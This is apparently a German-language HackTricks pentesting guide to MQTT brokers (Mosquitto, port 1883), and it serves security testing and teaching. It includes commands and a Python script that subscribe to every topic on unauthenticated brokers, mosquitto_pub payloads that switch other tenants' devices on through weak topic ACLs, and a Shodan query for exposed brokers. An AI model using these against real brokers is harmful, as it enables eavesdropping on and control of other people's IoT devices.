# 1883 - Pentesting MQTT (Mosquitto)

{{#include ../banners/hacktricks-training.md}}

## Grundlegende Informationen

**MQ Telemetry Transport (MQTT)** ist bekannt als ein **Publish/Subscribe-Messaging-Protokoll**, das sich durch seine extreme Einfachheit und Leichtgewichtigkeit auszeichnet. Dieses Protokoll ist speziell auf Umgebungen zugeschnitten, in denen Geräte nur begrenzte Fähigkeiten besitzen und über Netzwerke mit geringer Bandbreite, hoher Latenz oder unzuverlässigen Verbindungen betrieben werden. Die Kernziele von MQTT umfassen die Minimierung der Nutzung von Netzwerkbandbreite und die Verringerung der Anforderungen an Geräte-Ressourcen. Zusätzlich zielt es darauf ab, zuverlässige Kommunikation zu gewährleisten und ein gewisses Maß an Zustellgarantie bereitzustellen. Diese Ziele machen MQTT besonders geeignet für das wachsende Feld der **Maschine-zu-Maschine-Kommunikation (M2M)** und des **Internet der Dinge (IoT)**, wo es essenziell ist, eine Vielzahl von Geräten effizient zu verbinden. Darüber hinaus ist MQTT sehr vorteilhaft für mobile Anwendungen, bei denen das Sparen von Bandbreite und Akkulaufzeit entscheidend ist.

**Standardport:** 1883
```
PORT     STATE SERVICE                 REASON
1883/tcp open  mosquitto version 1.4.8 syn-ack
```
## Datenverkehr untersuchen

Wenn ein **CONNECT**-Paket von MQTT brokers empfangen wird, wird ein **CONNACK**-Paket zurückgesendet. Dieses Paket enthält einen return code, der entscheidend ist, um den Verbindungsstatus zu verstehen. Ein return code von **0x00** bedeutet, dass die credentials akzeptiert wurden, was eine erfolgreiche Verbindung anzeigt. Ein return code von **0x05** hingegen zeigt an, dass die credentials ungültig sind und somit die Verbindung verhindert wird.

Wenn der broker die Verbindung z. B. aufgrund ungültiger credentials ablehnt, würde das Szenario etwa so aussehen:
```
{
"returnCode": "0x05",
"description": "Connection Refused, not authorized"
}
```
![](<../images/image (976).png>)

### [**Brute-Force MQTT**](../generic-hacking/brute-force.md#mqtt)

## Pentesting MQTT

**Authentication is totally optional** und selbst wenn Authentication verwendet wird, **encryption is not used by default** (credentials are sent in clear text). MITM attacks können weiterhin ausgeführt werden, um Passwörter zu stehlen.

Um eine Verbindung zu einem MQTT-Service herzustellen, kannst du folgendes verwenden: [https://github.com/bapowell/python-mqtt-client-shell] und dich zu allen Topics abonnieren, indem du:
```
> connect (NOTICE that you need to indicate before this the params of the connection, by default 127.0.0.1:1883)
> subscribe "#" 1
> subscribe "$SYS/#"
```
Sie können auch [**https://github.com/akamai-threat-research/mqtt-pwn**](https://github.com/akamai-threat-research/mqtt-pwn) verwenden

Sie können außerdem verwenden:
```bash
apt-get install mosquitto mosquitto-clients
mosquitto_sub -t 'test/topic' -v #Subscribe to 'test/topic'
mosquitto_sub -h <host-ip> -t "#" -v #Subscribe to ALL topics.
```
Oder du könntest **diesen Code ausführen, um zu versuchen, dich ohne Authentifizierung mit einem MQTT-Service zu verbinden, alle Topics zu abonnieren und deren Nachrichten abzuhören**:
```python
#This is a modified version of https://github.com/Warflop/IOT-MQTT-Exploit/blob/master/mqtt.py
import paho.mqtt.client as mqtt
import time
import os

HOST = "127.0.0.1"
PORT = 1883

def on_connect(client, userdata, flags, rc):
client.subscribe('#', qos=1)
client.subscribe('$SYS/index.html#')

def on_message(client, userdata, message):
print('Topic: %s | QOS: %s  | Message: %s' % (message.topic, message.qos, message.payload))

def main():
client = mqtt.Client()
client.on_connect = on_connect
client.on_message = on_message
client.connect(HOST, PORT)
client.loop_start()
#time.sleep(10)
#client.loop_stop()

if __name__ == "__main__":
main()
```
### Das Publish/Subscribe-Muster <a href="#b667" id="b667"></a>

Das publish/subscribe-Modell besteht aus:

- **Publisher**: veröffentlicht eine Nachricht an ein oder mehrere Topic(s) im Broker.
- **Subscriber**: abonniert ein oder mehrere Topic(s) im Broker und erhält alle vom Publisher gesendeten Nachrichten.
- **Broker**: leitet alle Nachrichten von den Publishern an die Subscriber weiter.
- **Topic**: besteht aus einem oder mehreren Ebenen, die durch einen Slash getrennt sind (z. B. /smartshouse/livingroom/temperature).

### Paketformat <a href="#f15a" id="f15a"></a>

Jedes MQTT-Paket enthält einen fixed header (Figure 02).Figure 02: Fixed Header

![https://miro.medium.com/max/838/1*k6RkAHEk0576geQGUcKSTA.png](https://miro.medium.com/max/838/1*k6RkAHEk0576geQGUcKSTA.png)

### Pakettypen

- CONNECT (1): Vom Client initiiert, um eine Verbindung zum Server anzufordern.
- CONNACK (2): Die Bestätigung des Servers für eine erfolgreiche Verbindung.
- PUBLISH (3): Wird verwendet, um eine Nachricht vom Client an den Server oder umgekehrt zu senden.
- PUBACK (4): Bestätigung eines PUBLISH-Pakets.
- PUBREC (5): Teil eines Zustellprotokolls, das sicherstellt, dass die Nachricht empfangen wurde.
- PUBREL (6): Weitere Bestätigung in der Nachrichtenübermittlung, die die Freigabe einer Nachricht anzeigt.
- PUBCOMP (7): Abschließender Teil des Zustellprotokolls, der den Abschluss anzeigt.
- SUBSCRIBE (8): Anfrage eines Clients, Nachrichten eines Topics zu empfangen.
- SUBACK (9): Bestätigung des Servers einer SUBSCRIBE-Anfrage.
- UNSUBSCRIBE (10): Anfrage eines Clients, keine Nachrichten mehr von einem Topic zu erhalten.
- UNSUBACK (11): Antwort des Servers auf eine UNSUBSCRIBE-Anfrage.
- PINGREQ (12): Vom Client gesendete Heartbeat-Nachricht.
- PINGRESP (13): Antwort des Servers auf die Heartbeat-Nachricht.
- DISCONNECT (14): Vom Client initiiert, um die Verbindung zu beenden.
- Zwei Werte, 0 und 15, sind als reserved markiert und deren Verwendung ist verboten.

## IoT MQTT-Ökosystem-Angriffe: plaintext brokers und topic ACL bypass

Viele Consumer-IoT-Plattformen exponieren MQTT-Broker, die von zwei unterschiedlichen Rollen genutzt werden:
- Gateway-/Hub-Geräte, die Funkprotokolle (z. B. BLE/LoRa/Zigbee) an die Cloud anbinden.
- Mobile Apps oder Web-Backends, die Geräte über „app“-Topics steuern.

Häufige Schwachstellen, die du während eines pentest ausnutzen kannst:

- Plaintext MQTT über nicht-standardmäßige Ports (z. B. TCP/8001) anstelle von MQTTS. Jeder on-path-Beobachter kann Credentials und Control Frames lesen. Verwende Wireshark, um Klartext CONNECT/CONNACK- und SUBSCRIBE/PUBLISH-Traffic auf ungewöhnlichen Ports zu erkennen.
- Schwache oder fehlende per-tenant Topic-ACLs. Wenn Topics nur nach deviceId namespaced sind (z. B. "/tenantless/<deviceId>/tx"), könnte jeder authentifizierte Benutzer an die Geräte anderer Tenants PUBLISHen.
- Sensitive data leak via maintenance/admin topics (z. B. Wi‑Fi credentials broadcast in cleartext after config changes).

Beispiele (Platzhalter durch echte Werte ersetzen):

Abonniere potenziell sensitive Topics mit bekannten Topic-Präfixen und Geräte-IDs:
```bash
# Using mosquitto_sub
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
Cross-Tenant-Kontrolle bei schwachen ACLs (publish auf das device topic eines anderen Tenants):
```bash
mosquitto_pub -h <app-broker> -p <port> -V mqttv311 \
-i <your_client_id> -u <your_username> -P <your_password> \
-t "/ys/<victimDeviceId>/tx" \
-m '{"method":"Device.setState","params":{"state":{"power":"on"}},"targetDevice":"<victimDeviceId>"}'
```
## Shodan

- `port:1883 MQTT`
- MQTT-Klartext auf nicht standardmäßigen Ports ist in IoT häufig. Erwägen Sie, nach Brokern auf alternativen Ports zu suchen und dies mittels Protokollerkennung zu bestätigen.

## Referenzen

- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)

{{#include ../banners/hacktricks-training.md}}
